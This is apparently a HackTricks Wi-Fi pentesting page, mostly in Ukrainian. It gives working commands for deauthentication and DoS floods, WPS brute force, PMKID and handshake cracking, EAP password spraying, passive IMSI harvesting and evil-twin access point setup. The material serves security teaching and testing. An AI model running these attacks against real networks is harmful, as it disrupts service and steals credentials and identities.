# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Базові команди Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Інструменти

### Hijacker & NexMon (вбудований Wi‑Fi Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Запустити airgeddon за допомогою docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Може виконувати атаки Evil Twin, KARMA та Known Beacons, а потім використовувати phishing-шаблон, щоб отримати справжній пароль мережі або перехопити облікові дані соціальних мереж.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Цей інструмент автоматизує **WPS/WEP/WPA-PSK** атаки. Він автоматично:

- Встановлює інтерфейс у monitor mode
- Сканує можливі мережі - і дозволяє вибрати жертву(жертв)
- Якщо WEP - запускає WEP атаки
- Якщо WPA-PSK
- Якщо WPS: Pixie dust attack і bruteforce attack (уважно: brute-force attack може зайняти багато часу). Зверніть увагу, що він не пробує null PIN або database/generated PINs.
- Намагається перехопити PMKID з AP для подальшого crack
- Намагається deauthenticate клієнтів AP, щоб capture handshake
- Якщо PMKID або Handshake — намагається bruteforce, використовуючи top5000 паролів.

## Підсумок атак

- **DoS**
- Deauthentication/disassociation -- Відключити всіх (або конкретний ESSID/Client)
- Random fake APs -- Приховати мережі, можливе падіння сканерів
- Overload AP -- Намагається вбити AP (зазвичай не дуже корисно)
- WIDS -- Гратися з IDS
- TKIP, EAPOL -- Деякі специфічні атаки для DoS деяких AP
- **Cracking**
- Crack **WEP** (кілька інструментів і методів)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Корисно для capture captive portal creds та/або проведення LAN атак
- **WPA-PSK** Evil Twin -- Корисно для мережевих атак, якщо відомий пароль
- **WPA-MGT** -- Корисно для перехоплення корпоративних облікових даних
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Корисно для capture captive portal creds та/або проведення LAN атак
- **+ WPA** -- Корисно для capture WPA handshakes

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** атаки, поширений метод у Wi-Fi hacking, включають підробку "management" фреймів для **насильного відключення пристроїв від мережі**. Ці незашифровані пакети обманюють клієнтів, змушуючи їх вважати, що пакети походять від легітимної мережі, що дозволяє атакуючим збирати WPA handshakes для cracking або постійно порушувати мережеві з'єднання. Ця тактика, тривожно проста за своєю суттю, широко використовується і має значні наслідки для безпеки мереж.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 означає deauthentication
- 1 — це кількість deauths для відправлення (ви можете відправити кілька, якщо бажаєте); 0 означає відправляти їх безперервно
- -a 00:14:6C:7E:40:80 — це MAC-адреса точки доступу
- -c 00:0F:B5:34:30:30 — це MAC-адреса клієнта, якого потрібно deauthenticate; якщо це опущено, буде надіслано broadcast deauthentication (працює не завжди)
- ath0 — це ім'я інтерфейсу

### Disassociation Packets

**Disassociation packets**, подібні до deauthentication packets, є типом керуючого кадру, що використовується в Wi-Fi мережах. Ці пакети служать для розірвання з'єднання між пристроєм (наприклад, ноутбуком чи смартфоном) та точкою доступу (AP). Головна відмінність між disassociation та deauthentication полягає в їхніх сценаріях використання. Хоча AP випускає **deauthentication packets щоб явно видалити rogue devices з мережі, disassociation packets зазвичай надсилаються коли AP вимикається**, перезавантажується або переміщується, що вимагає відключення всіх підключених вузлів.

**This attack can be performed by mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Більше DOS атак від mdk4**

**Деталі** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Надсилає beacon frames, щоб показати fake APs клієнтам. Це іноді може спричинити збій network scanners і навіть drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Надсилання authentication frames до всіх доступних Access Points (APs) у зоні досяжності може перевантажити ці APs, особливо коли задіяно багато клієнтів. Такий інтенсивний трафік може призвести до нестабільності системи, через що деякі APs можуть зависнути або навіть перезавантажитися.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing точок доступу (APs) перевіряє, чи SSID правильно відображається та підтверджує радіус дії AP. Ця техніка, у поєднанні з **bruteforcing hidden SSIDs** з або без wordlist, допомагає ідентифікувати та отримати доступ до прихованих мереж.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Надсилання випадкових або дубльованих пакетів у різні QoS черги може викликати Michael Countermeasures на **TKIP APs**, що призведе до відключення AP на одну хвилину. Цей метод є ефективною тактикою атаки **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Затоплення AP **EAPOL Start frames** створює **fake sessions**, перевантажуючи AP і блокуючи легітимних клієнтів. Альтернативно, ін'єкція **fake EAPOL Logoff messages** примусово відключає клієнтів; обидва методи ефективно порушують роботу мережевого сервісу.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Атаки для IEEE 802.11s mesh networks**

Різноманітні атаки на управління лінками та маршрутизацію в mesh networks.

**ATTACK MODE w: WIDS Confusion**

Перехресне підключення клієнтів до кількох WDS nodes або фейкових rogue APs може маніпулювати Intrusion Detection and Prevention Systems, створюючи плутанину та потенційне зловживання системою.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet Fuzzer, який має різноманітні джерела пакетів та повний набір модифікаторів для маніпуляції пакетами.

### **Airggedon**

_**Airgeddon**_ пропонує більшість атак, описаних у попередніх коментарях:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) спрощує процес підключення пристроїв до маршрутизатора, прискорюючи та полегшуючи налаштування для мереж, зашифрованих **WPA** або **WPA2** Personal. Він неефективний проти легко компрометованої безпеки **WEP**. WPS використовує 8-значний PIN, який перевіряється у двох частинах, що робить його вразливим до brute-force атак через обмежену кількість комбінацій (близько 11 000 можливостей).

### WPS Bruteforce

Є 2 основні інструменти для виконання цієї операції: Reaver та Bully.

- **Reaver** був розроблений як надійний та практичний інструмент атаки проти WPS і був протестований на широкому спектрі точок доступу та реалізацій WPS.
- **Bully** — це **нова реалізація** WPS brute force атаки, написана на C. Вона має кілька переваг над оригінальним кодом reaver: менше залежностей, покращена продуктивність пам'яті та CPU, коректна обробка endianness і більш стійкий набір опцій.

Атака використовує вразливість **WPS PIN**, зокрема те, що перші чотири цифри та остання цифра як контрольна сума виявляються, що полегшує brute-force атаку. Однак захисти проти brute-force атак, такі як **blocking MAC addresses** агресивних атакувальників, вимагають **MAC address rotation** для продовження атаки.

Отримавши WPS PIN за допомогою інструментів на кшталт Bully або Reaver, атакуючий може вивести WPA/WPA2 PSK, забезпечуючи **постійний доступ до мережі**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

This refined approach targets WPS PINs using known vulnerabilities:

1. **Pre-discovered PINs**: Використовуйте базу даних відомих PINs, пов’язану з конкретними виробниками, які відомі тим, що використовують однакові WPS PINs. Ця база зіставляє перші три октети MAC-addresses з ймовірними PINs для цих виробників.
2. **PIN Generation Algorithms**: Застосовуйте алгоритми, такі як ComputePIN та EasyBox, які обчислюють WPS PINs на основі MAC-address AP. Алгоритм Arcadyan додатково вимагає device ID, що додає ще один рівень у процесі генерації PIN.

### WPS Pixie Dust attack

**Dominique Bongard** виявив вразливість у деяких Access Points (APs), пов’язану зі створенням секретних кодів, відомих як **nonces** (**E-S1** and **E-S2**). Якщо ці nonces можна визначити, зламати WPS PIN AP стає простіше. AP розкриває PIN у спеціальному коді (hash), щоб довести, що він легітимний і не є фейковим (rogue) AP. Ці nonces по суті є «ключами» до відкриття «сейфу», що зберігає WPS PIN. Детальніше можна знайти [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Простіше кажучи, суть у тому, що деякі APs не використовували достатньо випадкові ключі для шифрування PIN під час процесу встановлення з’єднання. Це робить PIN вразливим до вгадування ззовні мережі (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Якщо ви не хочете переводити пристрій у monitor mode, або `reaver` і `bully` викликають проблеми, ви можете спробувати [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Цей інструмент може виконувати Pixie Dust attack без необхідності переходити в monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Деякі погано спроєктовані системи навіть дозволяють **Null PIN** (порожній або неіснуючий PIN) надавати доступ, що досить незвично. Інструмент **Reaver** здатен тестувати цю вразливість, на відміну від **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Усі запропоновані WPS-атаки можна легко виконати за допомогою _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 і 6 дозволяють спробувати **ваш власний PIN** (якщо він є)
- 7 і 8 виконують **Pixie Dust attack**
- 13 дозволяє протестувати **NULL PIN**
- 11 і 12 будуть **збирати PIN-и, пов'язані з обраним AP, з доступних баз даних** та **згенерують** можливі **PIN-и** з використанням: ComputePIN, EasyBox і опційно Arcadyan (рекомендовано, чому б ні?)
- 9 і 10 перевірять **усі можливі PIN-и**

## **WEP**

Наразі він давно зламаний і майже не використовується. Просто знайте, що _**airgeddon**_ має опцію WEP під назвою "All-in-One" для атаки такого типу захисту. Більше інструментів пропонують подібні опції.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

У 2018 році **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) новий метод атаки, унікальний тим, що йому потрібен лише **one single packet** і він не вимагає підключених клієнтів до цільового AP — лише взаємодія між атакуючим і AP.

Багато сучасних роутерів додають **optional field** до **first EAPOL** frame під час асоціації, відомий як `Robust Security Network`. Це включає `PMKID`.

Як пояснює оригінальний пост, **PMKID** створюється з використанням відомих даних:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Оскільки "PMK Name" є сталою, ми знаємо BSSID AP та станції, а `PMK` ідентичний тому з повного 4-way handshake, **hashcat** може використати цю інформацію, щоб зламати PSK і відновити passphrase!

Щоб **зібрати** цю інформацію та **bruteforce** локально пароль, ви можете зробити:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs захоплені** будуть показані в **консолі** і також **збережені** всередині \_ **/tmp/attack.pcap**\_\
Тепер перетворіть захоплення у формат **hashcat/john** і зламайте його:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Зверніть увагу, що формат коректного hash містить **4 частини**, наприклад: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Якщо ваш **hash** **лише** містить **3 частини**, то він є **недійсним** (захоплення PMKID було недійсним).

Зверніть увагу, що `hcxdumptool` **також захоплює handshakes** (з'явиться щось на кшталт: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Ви можете **перетворити** ці **handshakes** у формат **hashcat**/**john** за допомогою `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Я помітив, що деякі handshakes, захоплені цим tool, не вдалося crack навіть при відомому password. Рекомендую, якщо можливо, також захоплювати handshakes традиційним способом або зібрати кілька handshakes за допомогою цього tool._

### Захоплення handshake

Атака на **WPA/WPA2** мережі може бути виконана шляхом захоплення **handshake** та спроби **crack** пароля **offline**. Процес передбачає моніторинг комунікації конкретної мережі та **BSSID** на певному **channel**. Ось стислий посібник:

1. Визначте **BSSID**, **channel**, та **connected client** цільової мережі.
2. Використайте `airodump-ng` для моніторингу мережевого трафіку на вказаному channel та BSSID з метою захоплення handshake. Команда виглядатиме так:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Щоб підвищити ймовірність захоплення handshake, тимчасово відключіть client від network, щоб примусити re-authentication. Це можна зробити за допомогою команди `aireplay-ng`, яка надсилає deauthentication packets до client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Як тільки в `airodump-ng` з'явиться інформація про handshake, це означає, що handshake було захоплено і ви можете припинити прослуховування:

![](<../../images/image (172) (1).png>)

Після того, як handshake було захоплено, ви можете **crack** його за допомогою `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Перевірити, чи є handshake у файлі

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Якщо цей інструмент знайде незавершений handshake певного ESSID раніше за завершений, він не виявить дійсний._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

У **налаштуваннях корпоративного WiFi ви зіштовхнетесь з різними методами автентифікації**, кожен з яких забезпечує різні рівні безпеки та функції управління. Коли ви використовуєте інструменти на кшталт `airodump-ng` для перегляду мережевого трафіку, ви можете помітити ідентифікатори цих типів автентифікації. Деякі поширені методи включають:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Цей метод підтримує апаратні токени та одноразові паролі в межах EAP-PEAP. На відміну від MSCHAPv2, він не використовує peer challenge і відправляє паролі у відкритому вигляді до точки доступу, що створює ризик для downgrade-атак.
2. **EAP-MD5 (Message Digest 5)**:
- Передбачає відправку MD5-хешу пароля від клієнта. Його **не рекомендується** використовувати через вразливість до словникових атак, відсутність автентифікації сервера та нездатність генерувати сесійні WEP-ключі.
3. **EAP-TLS (Transport Layer Security)**:
- Використовує сертифікати як на боці клієнта, так і на боці сервера для автентифікації та може динамічно генерувати користувацькі та сесійні WEP-ключі для захисту звʼязку.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Забезпечує взаємну автентифікацію через зашифрований тунель, а також метод виведення динамічних, для-користувача і для-сесії WEP-ключів. Потребує лише сертифікатів на боці сервера, клієнти використовують облікові дані.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Працює подібно до EAP, створюючи TLS-тунель для захищеного обміну. Він дозволяє використовувати слабші протоколи автентифікації поверх EAP завдяки захисту тунелю.
- **PEAP-MSCHAPv2**: Часто називають просто PEAP; поєднує вразливий механізм challenge/response MSCHAPv2 із захисним TLS-тунелем.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Схожий на EAP-TLS, але ініціює TLS-тунель перед обміном сертифікатами, пропонуючи додатковий рівень захисту.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Захоплення імені користувача

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Навіть використовуючи один з найбезпечніших методів автентифікації: **PEAP-EAP-TLS**, можливо **захопити імʼя користувача, відправлене в протоколі EAP**. Для цього потрібно **захопити аутентифікаційну сесію** (запустити `airodump-ng` на каналі і `wireshark` на тому самому інтерфейсі) та відфільтрувати пакети по `eapol`.\
Усередині пакету "**Response, Identity**" зʼявиться **username** клієнта.

![](<../../images/image (850).png>)

### Анонімні ідентичності

Приховування ідентичності підтримується як EAP-PEAP, так і EAP-TTLS. У контексті WiFi-мережі запит EAP-Identity зазвичай ініціюється точкою доступу (AP) під час асоціації. Щоб захистити анонімність користувача, відповідь від EAP-клієнта на пристрої користувача містить лише мінімальну інформацію, необхідну початковому RADIUS-серверу для обробки запиту. Це ілюструється наступними сценаріями:

- EAP-Identity = anonymous
- У цьому сценарії всі користувачі використовують псевдонім "anonymous" як ідентифікатор користувача. Початковий RADIUS-сервер працює як EAP-PEAP або EAP-TTLS сервер, відповідаючи за серверну частину протоколу PEAP або TTLS. Внутрішній (захищений) метод автентифікації потім обробляється локально або делегується віддаленому (home) RADIUS-серверу.
- EAP-Identity = anonymous@realm_x
- У цій ситуації користувачі з різних realm приховують свої ідентичності, водночас вказуючи відповідні realm. Це дозволяє початковому RADIUS-серверу проксувати запити EAP-PEAP або EAP-TTLS до RADIUS-серверів у їхніх домашніх realm, які діють як PEAP або TTLS сервер. Початковий RADIUS-сервер працює виключно як RADIUS relay node.
- Альтернативно, початковий RADIUS-сервер може функціонувати як EAP-PEAP або EAP-TTLS сервер і або обробляти захищений метод автентифікації, або пересилати його на інший сервер. Ця опція дозволяє налаштовувати різні політики для різних realm.

В EAP-PEAP, після встановлення TLS-тунелю між PEAP-сервером і PEAP-клієнтом, PEAP-сервер ініціює запит EAP-Identity і передає його через TLS-тунель. Клієнт відповідає на цей другий запит EAP-Identity, відправляючи EAP-Identity response, який містить справжню ідентичність користувача через зашифрований тунель. Такий підхід ефективно запобігає розкриттю реальної ідентичності користувача для будь-кого, хто прослуховує 802.11 трафік.

EAP-TTLS слідує трохи іншій процедурі. У випадку EAP-TTLS клієнт зазвичай автентифікується за допомогою PAP або CHAP, захищених TLS-тунелем. У цьому випадку клієнт включає атрибут User-Name і або Password, або CHAP-Password у початковому TLS-повідомленні, відправленому після встановлення тунелю.

Незалежно від обраного протоколу, PEAP/TTLS сервер дізнається справжню ідентичність користувача після встановлення TLS-тунелю. Справжня ідентичність може бути представлена як user@realm або просто user. Якщо PEAP/TTLS сервер також відповідає за автентифікацію користувача, він тепер має ідентичність користувача і продовжує обробку захищеного методом автентифікації через TLS-тунель. Альтернативно, PEAP/TTLS сервер може переправити новий RADIUS-запит до домашнього RADIUS-сервера користувача. Цей новий RADIUS-запит не містить шару PEAP або TTLS. У випадках, коли захищеним методом автентифікації є EAP, внутрішні EAP-повідомлення передаються до home RADIUS-сервера без обгортки EAP-PEAP або EAP-TTLS. Атрибут User-Name вихідного RADIUS-повідомлення містить справжню ідентичність користувача, замінюючи анонімний User-Name з вхідного RADIUS-запиту. Коли захищеним методом автентифікації є PAP або CHAP (підтримується лише TTLS), User-Name та інші атрибути автентифікації, витягнуті з TLS-пейлоаду, підставляються у вихідному RADIUS-повідомленні, заміщаючи анонімний User-Name і TTLS EAP-Message атрибути з вхідного RADIUS-запиту.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Натисніть, щоб розгорнути</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Примітки:
- Працює до встановлення будь‑якого TLS‑тунелю, якщо розгортання використовує чистий EAP‑SIM/AKA без захищеної ідентичності/псевдонімів.
- Опубліковане значення є постійним ідентифікатором, прив'язаним до SIM абонента; його збір дозволяє довготривале відстеження та подальші зловживання в телекомунікаціях.

Наслідки
- Privacy: persistent user/device tracking from passive Wi‑Fi captures in public places.
- Telecom abuse bootstrap: with the IMSI, an attacker with SS7/Diameter access can query location or attempt call/SMS interception and MFA theft.

Захист / на що звертати увагу
- Перевірте, що клієнти використовують анонімні зовнішні ідентичності (псевдоніми) для EAP‑SIM/AKA відповідно до рекомендацій 3GPP (e.g., 3GPP TS 33.402).
- Надавайте перевагу тунелюванню фази ідентифікації (e.g., EAP‑TTLS/PEAP carrying inner EAP‑SIM/AKA), щоб IMSI ніколи не відправлявся у відкритому вигляді.
- Packet captures of association/auth should never reveal a raw IMSI in EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list of usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Також цю атаку можна виконати за допомогою `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks Theory

### Network Selection and Roaming

- The 802.11 protocol defines how a station joins an Extended Service Set (ESS) but does not specify the criteria for selecting an ESS or an access point (AP) within it.
- Станції можуть перемикатися між AP, які ділять один і той самий ESSID, підтримуючи підключення по всій будівлі або території.
- Протокол вимагає аутентифікації станції до ESS, але не зобов'язує AP аутентифікуватися перед станцією.

### Preferred Network Lists (PNLs)

- Станції зберігають ESSID кожної бездротової мережі, до якої вони підключалися, у своєму Preferred Network List (PNL), разом з параметрами конфігурації, специфічними для мережі.
- PNL використовується для автоматичного підключення до відомих мереж, покращуючи досвід користувача шляхом спрощення процесу підключення.

### Passive Scanning

- AP періодично транслює beacon frames, оголошуючи свою присутність та можливості, включно з ESSID AP, якщо трансляція не вимкнена.
- Під час пасивного сканування станції слухають beacon frames. Якщо ESSID у beacon збігається з записом у PNL станції, станція може автоматично підключитися до того AP.
- Знання PNL пристрою дозволяє потенційно експлуатувати його, імітуючи ESSID відомої мережі та обманюючи пристрій для підключення до rogue AP.

### Active Probing

- Active probing передбачає, що станції відправляють probe requests для виявлення сусідніх AP та їхніх характеристик.
- Directed probe requests націлені на конкретний ESSID, допомагаючи визначити, чи певна мережа знаходиться в межах досяжності, навіть якщо це hidden network.
- Broadcast probe requests мають поле SSID, що дорівнює null, і відправляються всім сусіднім AP, дозволяючи станції перевірити наявність будь-якої preferred network без розкриття вмісту свого PNL.

## Simple AP with redirection to Internet

Перш ніж пояснювати, як виконувати більш складні атаки, буде пояснено **як** просто **створити** **AP** та **перенаправити** його **трафік** на інтерфейс, підключений **до** **Інтернету**.

Використовуючи `ifconfig -a` перевірте, що інтерфейс wlan для створення AP та інтерфейс, підключений до Інтернету, присутні.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Створіть конфігураційний файл `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Потім **set IPs** і **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
А потім **запустіть** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Створіть конфігураційний файл `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Зупиніть набридливі процеси** , встановіть **monitor mode**, і **запустіть hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Перенаправлення та редиректи
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Атака Evil Twin експлуатує спосіб, яким WiFi-клієнти розпізнають мережі, покладаючись переважно на ім'я мережі (ESSID) і не вимагаючи від базової станції (access point) автентифікації перед клієнтом. Основні моменти включають:

- **Ускладнення розрізнення**: Пристрої важко відрізнити легітимні та зловмисні access points, коли вони мають той самий ESSID і тип шифрування. У реальних мережах часто використовують кілька access points з тим самим ESSID для безшовного розширення покриття.
- **Роумінг клієнта та маніпуляція підключенням**: Протокол 802.11 дозволяє пристроям переходити між access points в межах того самого ESS. Атакувальники можуть використовувати це, змушуючи пристрій відключитися від поточної базової станції та підключитися до зловмисної. Це можна досягти, пропонуючи сильніший сигнал або порушуючи з'єднання з легітимною access point за допомогою таких методів, як deauthentication packets або jamming.
